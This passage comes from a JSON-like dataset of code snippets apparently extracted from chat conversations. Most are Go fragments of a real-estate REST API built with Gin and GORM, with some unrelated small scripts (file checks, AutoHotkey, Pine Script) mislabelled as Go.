}\n}",
    "filename": "c73e01621fb777d103e7253eb8d6bbeb_8.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package models\n\n   import (\n     \"gorm.io/gorm\"\n   )\n\n   type Listing struct {\n     gorm.Model\n     Address string\n     Price   float64\n     // Autres champs...\n   }",
    "filename": "67200576435ded6570cd4a459a6654f6_2.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import (\n     \"fmt\"\n     \"log\"\n     \"net/http\"\n\n     \"github.com/gin-gonic/gin\"\n     \"gorm.io/driver/postgres\"\n     \"gorm.io/gorm\"\n     \"real-estate-api/controllers\"\n     _ \"real-estate-api/docs\" // swag init generated docs\n   )\n\n   var (\n     db *gorm.DB\n     err error\n   )\n\n   func init() {\n     dsn := \"host=localhost user=your_user password=your_password dbname=your_db port=5432 sslmode=disable TimeZone=Asia/Shanghai\"\n     db, err = gorm.Open(postgres.Open(dsn), &gorm.Config{})\n     if err != nil {\n       log.Fatal(\"Error connecting to database: \", err)\n     }\n   }\n\n   // @title Real Estate API\n   // @description This is a sample server for real estate management.\n   // @BasePath /api/v1\n\n   func main() {\n     // Initialize Gin router\n     r := gin.Default()\n\n     controllers.RegisterRoutes(r, db)\n\n     r.GET(\"/swagger/*any\", ginSwagger.WrapHandler(swaggerFiles.Handler))\n\n     log.Fatal(http.ListenAndServe(\":8080\", r))\n   }",
    "filename": "67200576435ded6570cd4a459a6654f6_3.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "// controllers/listings_controller.go\n\n   package controllers\n\n   import (\n     \"net/http\"\n\n     \"github.com/gin-gonic/gin\"\n     \"gorm.io/gorm\"\n     \"real-estate-api/models\"\n   )\n\n   func RegisterRoutes(router *gin.Engine, db *gorm.DB) {\n     router.POST(\"/listings\", func(c *gin.Context) {\n       // Implémentation de la création d'une annonce\n     })\n\n     // Définition d'autres routes...\n   }",
    "filename": "67200576435ded6570cd4a459a6654f6_4.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import (\n     \"log\"\n     \"net/http\"\n\n     \"github.com/gin-gonic/gin\"\n     \"github.com/jinzhu/gorm\"\n     _ \"github.com/jinzhu/gorm/dialects/postgres\"\n     \"real-estate-api/controllers\"\n     _ \"real-estate-api/docs\" // swag init generated docs\n   )\n\n   var db *gorm.DB\n   var err error\n\n   func init() {\n     // Votre connection string pourrait être différente. Modifiez-la en fonction de vos paramètres.\n     dsn := \"host=localhost user=your_user password=your_password dbname=your_db sslmode=disable\"\n     db, err = gorm.Open(\"postgres\", dsn)\n     if err != nil {\n       log.Fatal(\"Error connecting to database: \", err)\n     }\n   }\n\n   // @title Real Estate API\n   // @description This is a sample server for real estate management.\n   // @BasePath /api/v1\n\n   func main() {\n     r := gin.Default()\n     controllers.RegisterRoutes(r, db)\n     \n     // ...\n\n     log.Fatal(http.ListenAndServe(\":8080\", r))\n   }",
    "filename": "67200576435ded6570cd4a459a6654f6_7.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import (\n     \"log\"\n     \"net/http\"\n\n     \"github.com/gin-gonic/gin\"\n     \"gorm.io/driver/postgres\"\n     \"gorm.io/gorm\"\n     \"real-estate-api/controllers\"\n     _ \"real-estate-api/docs\" // swag init generated docs\n     \"github.com/swaggo/files\"\n     \"github.com/swaggo/gin-swagger\"\n   )\n\n   var db *gorm.DB\n   var err error\n\n   func init() {\n     dsn := \"host=localhost user=your_user password=your_password dbname=your_db port=5432 sslmode=disable TimeZone=Asia/Shanghai\"\n     db, err = gorm.Open(postgres.Open(dsn), &gorm.Config{})\n     if err != nil {\n       log.Fatalf(\"failed to connect database: %v\", err)\n     }\n\n     // Automigrate your models here, e.g.:\n     // db.AutoMigrate(&models.Listing{})\n   }\n\n   // @title Real Estate API\n   // @description This is a sample server for real estate management.\n   // @BasePath /api/v1\n\n   func main() {\n     r := gin.Default()\n     controllers.RegisterRoutes(r, db)\n\n     r.GET(\"/swagger/*any\", ginSwagger.WrapHandler(swaggerFiles.Handler))\n\n     log.Fatal(http.ListenAndServe(\":8080\", r))\n   }",
    "filename": "67200576435ded6570cd4a459a6654f6_8.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package models\n\n   import (\n     \"gorm.io/gorm\"\n   )\n\n   type Listing struct {\n     gorm.Model\n     Address string\n     Price   float64\n     // D'autres champs...\n   }",
    "filename": "67200576435ded6570cd4a459a6654f6_9.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package routes\n\nimport (\n    \"github.com/gin-gonic/gin\"\n    \"real-estate-api/controllers\"\n)\n\nfunc RegisterRoutes(router *gin.Engine) {\n    api := router.Group(\"/api\")\n    {\n        v1 := api.Group(\"/v1\")\n        {\n            // Ici, nous ajoutons nos routes pour les listings, en les associant à leurs contrôleurs.\n            listings := v1.Group(\"/listings\")\n            {\n                listings.GET(\"/\", controllers.GetAllListings)\n                listings.POST(\"/\", controllers.CreateListing)\n                listings.GET(\"/:id\", controllers.GetListingByID)\n                listings.PUT(\"/:id\", controllers.UpdateListing)\n                listings.DELETE(\"/:id\", controllers.DeleteListing)\n            }\n            // Vous pouvez ajouter d'autres routes pour d'autres ressources de manière similaire.\n        }\n    }\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_10.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    // ...\n    r := gin.Default()\n    routes.RegisterRoutes(r)\n    // ...\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_11.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "package controllers\n\nimport (\n\t\"net/http\"\n\t\"github.com/gin-gonic/gin\"\n\t// Importez les autres packages nécessaires comme la logique métier ou les modèles de données.\n)\n\n// CreateAppartment gère la création d'un nouvel appartement.\nfunc CreateAppartment(c *gin.Context) {\n\t// Votre logique pour la création d'un appartement.\n}\n\n// GetAppartements renvoie la liste de tous les appartements.\nfunc GetAppartements(c *gin.Context) {\n\t// Votre logique pour récupérer tous les appartements.\n}\n\n// GetAppartement renvoie un appartement spécifique par son ID.\nfunc GetAppartement(c *gin.Context) {\n\t// Votre logique pour récupérer un appartement par ID.\n}\n\n// UpdateAppartement gère la mise à jour d'un appartement.\nfunc UpdateAppartement(c *gin.Context) {\n\t// Votre logique pour mettre à jour un appartement.\n}\n\n// DeleteAppartement gère la suppression d'un appartement.\nfunc DeleteAppartement(c *gin.Context) {\n\t// Votre logique pour supprimer un appartement.\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_12.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 14,
    "language": "Go",
    "libraries": [],
    "code": "// models/appartement.go\npackage models\n\nimport \"gorm.io/gorm\"\n\ntype Appartement struct {\n    gorm.Model\n    Adresse       string\n    Chambres      int\n    Prix          float64\n    Description   string\n}\n\n// models/agent.go\npackage models\n\nimport \"gorm.io/gorm\"\n\ntype Agent struct {\n    gorm.Model\n    Nom       string\n    Email     string\n    Telephone string\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_14.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "// controllers/appartements.go\npackage controllers\n\nimport (\n    \"net/http\"\n    \"real-estate-api/models\"\n\n    \"github.com/gin-gonic/gin\"\n    \"gorm.io/gorm\"\n)\n\nvar db *gorm.DB\n\nfunc InitAppartementController(database *gorm.DB) {\n    db = database\n}\n\nfunc CreateAppartement(c *gin.Context) {\n    var newAppartement models.Appartement\n    if err := c.BindJSON(&newAppartement); err == nil {\n        db.Create(&newAppartement)\n        c.JSON(http.StatusCreated, newAppartement)\n    } else {\n        c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n    }\n}\n\nfunc GetAppartements(c *gin.Context) {\n    var appartements []models.Appartement\n    db.Find(&appartements)\n    c.JSON(http.StatusOK, appartements)\n}\n\nfunc GetAppartement(c *gin.Context) {\n    id := c.Param(\"id\")\n    var appartement models.Appartement\n    if result := db.First(&appartement, id); result.Error == nil {\n        c.JSON(http.StatusOK, appartement)\n    } else {\n        c.JSON(http.StatusNotFound, gin.H{\"error\": \"Appartement not found\"})\n    }\n}\n\nfunc UpdateAppartement(c *gin.Context) {\n    id := c.Param(\"id\")\n    var appartement models.Appartement\n    if err := db.First(&appartement, id).Error; err != nil {\n        c.JSON(http.StatusNotFound, gin.H{\"error\": \"Appartement not found\"})\n        return\n    }\n\n    if err := c.BindJSON(&appartement); err == nil {\n        db.Save(&appartement)\n        c.JSON(http.StatusOK, appartement)\n    } else {\n        c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n    }\n}\n\nfunc DeleteAppartement(c *gin.Context) {\n    id := c.Param(\"id\")\n    if result := db.Delete(&models.Appartement{}, id); result.Error == nil {\n        c.Status(http.StatusNoContent)\n    } else {\n        c.JSON(http.StatusNotFound, gin.H{\"error\": \"Appartement not found\"})\n    }\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_15.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 16,
    "language": "Go",
    "libraries": [],
    "code": "package models\n\nimport \"gorm.io/gorm\"\n\ntype Appartement struct {\n    gorm.Model\n    Adresse     string\n    Chambres    int\n    Prix        float64\n    Description string\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_16.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "package models\n\nimport \"gorm.io/gorm\"\n\ntype Agent struct {\n    gorm.Model\n    Nom       string\n    Email     string\n    Telephone string\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_17.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 18,
    "language": "Go",
    "libraries": [],
    "code": "package controllers\n\nimport (\n    \"net/http\"\n    \"real-estate-api/models\"\n    \"github.com/gin-gonic/gin\"\n    \"gorm.io/gorm\"\n)\n\nfunc CreateAppartement(db *gorm.DB) gin.HandlerFunc {\n    return func(c *gin.Context) {\n        var newAppartement models.Appartement\n        if err := c.BindJSON(&newAppartement); err == nil {\n            db.Create(&newAppartement)\n            c.JSON(http.StatusCreated, newAppartement)\n        } else {\n            c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n        }\n    }\n}\n\n// ... autres fonctions pour les appartements",
    "filename": "67200576435ded6570cd4a459a6654f6_18.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 19,
    "language": "Go",
    "libraries": [],
    "code": "package controllers\n\nimport (\n    \"net/http\"\n    \"real-estate-api/models\"\n    \"github.com/gin-gonic/gin\"\n    \"gorm.io/gorm\"\n)\n\nfunc CreateAgent(db *gorm.DB) gin.HandlerFunc {\n    return func(c *gin.Context) {\n        var newAgent models.Agent\n        if err := c.BindJSON(&newAgent); err == nil {\n            db.Create(&newAgent)\n            c.JSON(http.StatusCreated, newAgent)\n        } else {\n            c.JSON(http.StatusBadRequest, gin.H{\"error\": err.Error()})\n        }\n    }\n}\n\n// ... autres fonctions pour les agents",
    "filename": "67200576435ded6570cd4a459a6654f6_19.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 20,
    "language": "Go",
    "libraries": [],
    "code": "package routes\n\nimport (\n    \"github.com/gin-gonic/gin\"\n    \"real-estate-api/controllers\"\n    \"gorm.io/gorm\"\n)\n\nfunc RegisterRoutes(router *gin.Engine, db *gorm.DB) {\n    api := router.Group(\"/api\")\n    {\n        v1 := api.Group(\"/v1\")\n        {\n            appartements := v1.Group(\"/appartements\")\n            {\n                appartements.POST(\"/\", controllers.CreateAppartement(db))\n                // ... autres routes pour appartements\n            }\n\n            agents := v1.Group(\"/agents\")\n            {\n                agents.POST(\"/\", controllers.CreateAgent(db))\n                // ... autres routes pour agents\n            }\n        }\n    }\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_20.go"
  },
  {
    "conversation_hash": "67200576435ded6570cd4a459a6654f6",
    "code_index": 21,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"log\"\n    \"net/http\"\n    \"github.com/gin-gonic/gin\"\n    \"gorm.io/driver/postgres\"\n    \"gorm.io/gorm\"\n    \"real-estate-api/models\"\n    \"real-estate-api/routes\"\n)\n\nfunc main() {\n    dsn := \"host=localhost user=your_username password=your_password dbname=your_dbname port=5432 sslmode=disable TimeZone=Asia/Shanghai\"\n    db, err := gorm.Open(postgres.Open(dsn), &gorm.Config{})\n    if err != nil {\n        log.Fatalf(\"failed to connect database: %v\", err)\n    }\n\n    // Auto migrate our models\n    db.AutoMigrate(&models.Appartement{}, &models.Agent{})\n\n    router := gin.Default()\n\n    // Register the routes\n    routes.RegisterRoutes(router, db)\n\n    log.Fatal(http.ListenAndServe(\":8080\", router))\n}",
    "filename": "67200576435ded6570cd4a459a6654f6_21.go"
  },
  {
    "conversation_hash": "5700f7ecd074f38a88f231dae3b476e3",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc fileExists(filepath string) bool {\n\t_, err := os.Stat(filepath)\n\tif os.IsNotExist(err) {\n\t\treturn false\n\t}\n\treturn err == nil\n}\n\nfunc main() {\n\tfilepath := \"example.txt\"\n\n\tif fileExists(filepath) {\n\t\tfmt.Printf(\"File '%s' exists.\\n\", filepath)\n\t} else {\n\t\tfmt.Printf(\"File '%s' does not exist.\\n\", filepath)\n\t}\n}",
    "filename": "5700f7ecd074f38a88f231dae3b476e3_0.go"
  },
  {
    "conversation_hash": "5700f7ecd074f38a88f231dae3b476e3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n)\n\n// fileExists checks if a file exists and is not a directory before we\n// try using it to prevent further errors.\nfunc fileExists(filepath string) (bool, error) {\n\tinfo, err := os.Stat(filepath)\n\tif err == nil {\n\t\treturn !info.IsDir(), nil\n\t}\n\tif os.IsNotExist(err) {\n\t\treturn false, nil\n\t}\n\t// File may exist but there's another error, like permission denied.\n\treturn false, err\n}\n\nfunc main() {\n\tfilepath := \"example.txt\"\n\n\texists, err := fileExists(filepath)\n\tif err != nil {\n\t\tfmt.Printf(\"Error checking if file exists: %s\\n\", err)\n\t} else if exists {\n\t\tfmt.Printf(\"File '%s' exists.\\n\", filepath)\n\t} else {\n\t\tfmt.Printf(\"File '%s' does not exist.\\n\", filepath)\n\t}\n}",
    "filename": "5700f7ecd074f38a88f231dae3b476e3_1.go"
  },
  {
    "conversation_hash": "1fca44de15789081ec45cc68db131389",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "^j::\nfilesY := [130, 150, 175, 193, 214, 236, 258, 278]\nfor index, Y in filesY\n{\n    Click, 484, %Y%, 2\n    Sleep, 1000  ; Дать время на открытие файла\n\n    ; Ваши действия над файлом\n    \n    Send, !{F4}  ; Закрыть активное окно файла\n    Sleep, 1000  ; Дать время на закрытие файла\n}\nreturn",
    "filename": "1fca44de15789081ec45cc68db131389_17.go"
  },
  {
    "conversation_hash": "08e3776eae32c90d7b2a38f9f644b105",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"London and New York Sessions\", overlay=true)\n\n// Defining London and New York Sessions\nvar string LondonSession = \"0700-1600\"\nvar string NewYorkSession = \"1300-2200\"\n\n// Colors for London and New York sessions\nvar color LondonColor = color.new(color.green, 90)\nvar color NewYorkColor = color.new(color.blue, 90)\n\n// Function to check if current time is within a defined session\ninSession(sessionTime) =>\n    not na(time(timeframe.period, sessionTime))\n\n// Check if in London or New York session\ninLondon = inSession(LondonSession)\ninNewYork = inSession(NewYorkSession)\n\n// Plot background colors for sessions\nbgcolor(inLondon ? LondonColor : na)\nbgcolor(inNewYork ? NewYorkColor : na)\n\n// Display labels for session starts\nvar label LondonLabel = na\nvar label NewYorkLabel = na\nif (inLondon and not inLondon[1])\n    label.delete(LondonLabel)\n    LondonLabel := label.new(bar_index, low, \"London Session Start\", color=color.white, style=label.style_label_down, textcolor=color.black, size=size.normal)\nif (inNewYork and not inNewYork[1])\n    label.delete(NewYorkLabel)\n    NewYorkLabel := label.new(bar_index, low, \"New York Session Start\", color=color.white, style=label.style_label_up, textcolor=color.black, size=size.normal)\n\n// Alerts for session starts - optional, can be added per user needs\nalertcondition(inLondon and not inLondon[1], title=\"London Open\", message=\"The London Session has started\")\nalertcondition(inNewYork and not inNewYork[1], title=\"New York Open\", message=\"The New York Session has started\")",
    "filename": "08e3776eae32c90d7b2a38f9f644b105_0.go"
  },
  {
    "conversation_hash": "917a8a4667f623c01acbbadd2f842e2f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Custom Order Block Detector\", shorttitle=\"COBD\", overlay=true)\n\n// تابع برای تشخیص Order Block\nisOrderBlock(bearish) =>\n    bearish ? (close[1] < open[1] and high[1] == highest(high, 5)) : (close[1] > open[1] and low[1] == lowest(low, 5))\n\n// پیدا کردن Order Block وارد نشده\nnotEnteredOrderBlock = na\nfor i = 1 to 1000\n    if (isOrderBlock(true)[i] or isOrderBlock(false)[i])\n        allNotEntered = true\n        for j = 0 to i-1\n            // بررسی کردن آیا کندلی داخل محدوده order block است\n            if (low[j] <= high[i] and high[j] >= low[i])\n                allNotEntered := false\n                break\n        if (allNotEntered)\n            notEnteredOrderBlock := i\n            break\n\nif (notEnteredOrderBlock != na)\n    obHigh = high[notEnteredOrderBlock]\n    obLow = low[notEnteredOrderBlock]\n    plotshape(series=isOrderBlock(true)[notEnteredOrderBlock], location=location.abovebar, color=color.red, style=shape.labeldown, text=\"Sell OB\", size=size.small)\n    plotshape(series=isOrderBlock(false)[notEnteredOrderBlock], location=location.belowbar, color=color.green, style=shape.labelup, text=\"Buy OB\", size=size.small)\n    hline(obHigh, \"Order Block High\", color=color.red)\n    hline(obLow, \"Order Block Low\", color=color.green)",
    "filename": "917a8a4667f623c01acbbadd2f842e2f_0.go"
  },
  {
    "conversation_hash": "917a8a4667f623c01acbbadd2f842e2f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Custom Order Block Detector\", shorttitle=\"COBD\", overlay=true)\n\n// تابع برای تشخیص Order Block\nisOrderBlock(bearish) =>\n    bearish ? (close[1] < open[1] and high[1] == highest(high, 5)) : (close[1] > open[1] and low[1] == lowest(low, 5))\n\n// پیدا کردن Order Block وارد نشده\nnotEnteredOrderBlock = na\nfor i = 1 to 1000\n    if (isOrderBlock(true)[i] or isOrderBlock(false)[i])\n        allNotEntered = true\n        for j = 0 to i-1\n            // بررسی کردن آیا کندلی داخل محدوده order block است\n            if (low[j] <= high[i] and high[j] >= low[i])\n                allNotEntered := false\n                break\n        if (allNotEntered)\n            notEnteredOrderBlock := i\n            break\n\nif (notEnteredOrderBlock != na)\n    obHigh = high[notEnteredOrderBlock]\n    obLow = low[notEnteredOrderBlock]\n    plotshape(series=isOrderBlock(true)[notEnteredOrderBlock], location=location.abovebar, color=color.red, style=shape.labeldown, text=\"Sell OB\", size=size.small)\n    plotshape(series=isOrderBlock(false)[notEnteredOrderBlock], location=location.belowbar, color=color.green, style=shape.labelup, text=\"Buy OB\", size=size.small)\n    hline(obHigh, \"Order Block High\", color=color.red)\n    hline(obLow, \"Order Block Low\", color=color.green)",
    "filename": "917a8a4667f623c01acbbadd2f842e2f_1.go"
  },
  {
    "conversation_hash": "3125c654772aa75ca8bbc783d1902dcd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello, World!\")\n}",
    "filename": "3125c654772aa75ca8bbc783d1902dcd_0.go"
  },
  {
    "conversation_hash": "3125c654772aa75ca8bbc783d1902dcd",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\n// Функция inc() увеличивает значение на 1 и возвращает его\nfunc inc(x int) int {\n    return x + 1\n}\n\n// Функция increment() также увеличивает значение на 1, но изменяет исходный аргумент по ссылке\nfunc increment(x *int) {\n    *x = *x + 1\n}\n\nfunc main() {\n    // Пример использования функции inc()\n    result := inc(5)\n    fmt.Println(\"inc() result:\", result) // Результат: 6\n\n    // Пример использования функции increment()\n    num := 10\n    increment(&num)\n    fmt.Println(\"increment() result:\", num) // Результат: 11\n}",
    "filename": "3125c654772aa75ca8bbc783d1902dcd_2.go"
  },
  {
    "conversation_hash": "3125c654772aa75ca8bbc783d1902dcd",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc inc(x int) int {\n    return x + 1\n}\n\nfunc main() {\n    for i := 0; i < 5; i++ {\n        result := inc(i)\n        fmt.Println(\"Number:\", i, \"Incremented number:\", result)\n    }\n}",
    "filename": "3125c654772aa75ca8bbc783d1902dcd_3.go"
  },
  {
    "conversation_hash": "3125c654772aa75ca8bbc783d1902dcd",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc increment(x *int) {\n    *x = *x + 1\n}\n\nfunc main() {\n    num := 10\n    fmt.Println(\"Initial value:\", num)\n\n    increment(&num)\n    fmt.Println(\"After incrementing:\", num)\n\n    // Можно использовать функцию increment() несколько раз\n    increment(&num)\n    fmt.Println(\"After incrementing again:\", num)\n}",
    "filename": "3125c654772aa75ca8bbc783d1902dcd_4.go"
  },
  {
    "conversation_hash": "95d1344c6ce2413e48336cafce7bba8a",
    "code_index": 21,
    "language": "Go",
    "libraries": [],
    "code": "aventure \"La Quête de Jojo\" {\n    jojoSi (choix == \"gauche\") {\n        imprime(\"Tu as rencontré un dragon!\")\n    } jojoSinon {\n        imprime(\"La pièce est vide, continue à explorer.\")\n    }\n}",
    "filename": "95d1344c6ce2413e48336cafce7bba8a_21.go"
  },
  {
    "conversation_hash": "9663affce2768b740a1a5cd454732673",
    "code_index": 7,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "// Calculate the difference in days between the current date and the due date\ndaysUntilDue = calculateDaysUntilDue(dueDateField)\n\n// Decision-making process\nif (daysUntilDue >= 0 and daysUntilDue <= 7) {\n    // If the due date is within 0-7 days, seek approval from the user manager\n    redirectToUserManagerApproval()\n} else if (daysUntilDue >= 8) {\n    // If the due date is 8 days or more away, seek approval from the IT manager\n    redirectToITManagerApproval()\n} else {\n    // Handle cases where the due date might be in the past or invalid\n    handleInvalidDueDate()\n}",
    "filename": "9663affce2768b740a1a5cd454732673_7.go"
  },
  {
    "conversation_hash": "486a1ed96b500e81153c5f2364c0b2a1",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package mypackage\n\nvar staticVar int // package-level, but not exported outside the package\n\nfunc Increment() int {\n    staticVar++\n    return staticVar\n}",
    "filename": "486a1ed96b500e81153c5f2364c0b2a1_1.go"
  },
  {
    "conversation_hash": "486a1ed96b500e81153c5f2364c0b2a1",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"mypackage\"\n)\n\nfunc main() {\n    fmt.Println(mypackage.Increment()) // Outputs: 1\n    fmt.Println(mypackage.Increment()) // Outputs: 2\n}",
    "filename": "486a1ed96b500e81153c5f2364c0b2a1_2.go"
  },
  {
    "conversation_hash": "762f9a3f41c2562ba663692e21ecce9f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "func (s *ApartmentServiceImpl) Create(appartment request.CreateApartmentRequest) error {\n    // your implementation\n}\n\nfunc (s *ApartmentServiceImpl) Update(appartment request.UpdateApartmentRequest) error {\n    // your implementation\n}\n\nfunc (s *ApartmentServiceImpl) Delete(id int) error {\n    // your implementation\n}",
    "filename": "762f9a3f41c2562ba663692e21ecce9f_0.go"
  },
  {
    "conversation_hash": "762f9a3f41c2562ba663692e21ecce9f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "func NewApartmentServiceImpl(repository *ApartmentsRepositoryImpl, validator *validator.Validate) *ApartmentServiceImpl {\n    return &ApartmentServiceImpl{\n        // initialization\n    }\n}",
    "filename": "762f9a3f41c2562ba663692e21ecce9f_1.go"
  },
  {
    "conversation_hash": "762f9a3f41c2562ba663692e21ecce9f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func (a *ApartmentServiceImpl) Create(appartment request.CreateApartmentRequest) error {\n    // Your existing logic\n    return nil  // Or return an actual error if something goes wrong\n}\n\nfunc (a *ApartmentServiceImpl) Update(appartment request.UpdateApartmentRequest) error {\n    // Your existing logic\n    return nil  // Or return an actual error if something goes wrong\n}\n\nfunc (a *ApartmentServiceImpl) Delete(id int) error {\n    // Your existing logic\n    return nil  // Or return an actual error if something goes wrong\n}",
    "filename": "762f9a3f41c2562ba663692e21ecce9f_2.go"
  },
  {
    "conversation_hash": "762f9a3f41c2562ba663692e21ecce9f",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package service\n\nimport (\n    \"Real_estate_api/data/request\"\n    \"Real_estate_api/data/response\"\n)\n\n// ApartmentService outlines the operations supported by the apartment service.\ntype ApartmentService interface {\n    Create(apartment request.CreateApartmentRequest) error\n    Update(apartment request.UpdateApartmentRequest) error\n    Delete(id int) error\n    FindAll() []response.AppartmentResponse\n    FindByID(id int) (response.AppartmentResponse, error)\n}",
    "filename": "762f9a3f41c2562ba663692e21ecce9f_3.go"
  },
  {
    "conversation_hash": "762f9a3f41c2562ba663692e21ecce9f",
    "code_index": 4,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package service\n\nimport (\n    \"Real_estate_api/data/request\"\n    \"Real_estate_api/data/response\"\n    \"Real_estate_api/models\"\n    \"Real_estate_api/repository\"\n    \"github.com/go-playground/validator/v10\"\n)\n\n// ApartmentServiceImpl is the struct that implements the ApartmentService interface.\ntype ApartmentServiceImpl struct {\n    ApartmentRepository repository.ApartmentRepository\n    Validate            *validator.Validate\n}\n\n// NewApartmentServiceImpl creates a new instance of ApartmentServiceImpl.\nfunc NewApartmentServiceImpl(apartmentRepository repository.ApartmentRepository, validate *validator.Validate) *ApartmentServiceImpl {\n    return &ApartmentServiceImpl{ApartmentRepository: apartmentRepository, Validate: validate}\n}\n\n// Create handles the logic to add a new apartment.\nfunc (a *ApartmentServiceImpl) Create(apartment request.CreateApartmentRequest) error {\n    if err := a.Validate.Struct(apartment); err != nil {\n        return err\n    }\n    apartmentData := models.Appartement{\n        // Assuming this model struct is correctly mapped to the fields of the request.\n    }\n    return a.ApartmentRepository.Save(apartmentData)\n}\n\n// Update updates an existing apartment's details.\nfunc (a *ApartmentServiceImpl) Update(apartment request.UpdateApartmentRequest) error {\n    if err := a.Validate.Struct(apartment); err != nil {\n        return err\n    }\n    apartmentData := models.Appartement{\n        // Assuming this model struct is correctly mapped to the fields of the request.\n    }\n    return a.ApartmentRepository.Update(apartmentData)\n}\n\n// Delete removes an apartment identified by id.\nfunc (a *ApartmentServiceImpl) Delete(id int) error {\n    return a.ApartmentRepository.Delete(id)\n}\n\n// FindAll fetches all apartments available.\nfunc (a *ApartmentServiceImpl) FindAll() ([]response.AppartmentResponse, error) {\n    apartments, err := a.ApartmentRepository.FindAll()\n    if err != nil {\n        return nil, err\n    }\n    var apartmentResponses []response.AppartmentResponse\n    for _, apartment := range apartments {\n        apartmentResponses = append(apartmentResponses, response.AppartmentResponse{\n            // Assuming this struct is correctly mapped from the apartment model.\n        })\n    }\n    return apartmentResponses, nil\n}\n\n// FindByID finds a single apartment by its id.\nfunc (a *ApartmentServiceImpl) FindByID(id int) (response.AppartmentResponse, error) {\n    apartment, err := a.ApartmentRepository.FindByID(id)\n    if err != nil {\n        return response.AppartmentResponse{}, err\n    }\n    return response.AppartmentResponse{\n        // Assuming this struct is correctly mapped from the apartment model.\n    }, nil\n}",
    "filename": "762f9a3f41c2562ba663692e21ecce9f_4.go"
  },
  {
    "conversation_hash": "a6c8350387121bb85130675a32bee9c7",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
